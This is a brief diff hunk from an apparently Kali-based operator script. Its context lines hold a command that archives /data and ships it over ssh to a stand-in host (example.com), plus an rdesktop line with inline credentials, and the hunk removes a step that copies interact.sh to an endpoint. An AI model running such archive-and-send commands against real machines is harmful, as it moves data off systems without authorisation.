@@ -89,5 +89,4 @@ collect_data="tar -czf data.tar.gz /data && ssh user@example.com 'mkdir -p data 
 # start a GUI if needed and RDP through SSH
 gui_access="rdesktop -u user -p password example.com"
 
-# Copy the interactive script to the endpoint
-scp interact.sh user@endpoint:/home/kali/tools/interact.sh
+
